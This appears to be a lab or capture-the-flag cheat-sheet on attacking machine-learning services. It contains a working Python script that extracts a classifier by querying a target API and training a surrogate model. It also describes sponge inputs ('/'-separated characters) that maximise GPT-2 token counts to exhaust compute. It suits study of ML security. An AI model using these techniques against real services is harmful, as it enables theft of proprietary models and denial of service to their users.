# Model Reverse Engineering & Sponge DoS

## Model Reverse Engineering

Query the API, collect input-output pairs, train a surrogate model:

```python
import random, requests, json
import pandas as pd
from sklearn.pipeline import make_pipeline
from sklearn.preprocessing import StandardScaler
from sklearn.linear_model import LogisticRegression
import joblib

N_SAMPLES = 100
CLASSIFIER_URL = "http://TARGET_IP:80/"

samples = {"Flipper Length (mm)": [], "Body Mass (g)": []}
for _ in range(N_SAMPLES):
    samples["Flipper Length (mm)"].append(random.uniform(150, 250))
    samples["Body Mass (g)"].append(random.uniform(2500, 6500))
samples_df = pd.DataFrame(samples)

predictions = {"species": []}
for i in range(N_SAMPLES):
    sample = {
        "flipper_length": samples["Flipper Length (mm)"][i],
        "body_mass": samples["Body Mass (g)"][i]
    }
    result = json.loads(requests.get(CLASSIFIER_URL, params=sample).text).get("result")
    predictions["species"].append(result)
predictions_df = pd.DataFrame(predictions)

surrogate_model = make_pipeline(StandardScaler(), LogisticRegression())
surrogate_model.fit(samples_df, predictions_df)
joblib.dump(surrogate_model, 'surrogate.joblib')

# Submit surrogate for evaluation
with open('surrogate.joblib', 'rb') as f:
    r = requests.post(CLASSIFIER_URL + '/model', files={'file': ('surrogate.joblib', f.read())})
    print(json.loads(r.text))  # {'accuracy': 0.985...}
```

## Sponge Examples (DoS)

Craft inputs that maximize tokens without increasing size. Forces worst-case compute.

**Token density examples (GPT-2):**

| Input | Chars | Tokens |
|-------|-------|--------|
| `This is an example text` | 23 | 5 |
| `Athazagoraphobia` | 16 | 7 |
| `A/h/z/g/r/p/p/` | 14 | 14 |

`/`-separated single chars = 1 token per character = maximum density.

**Check token count:**
```bash
python3 scripts/sponge.py
> A/h/z/g/r/p/p/
Characters: 14
Tokens: 14
```
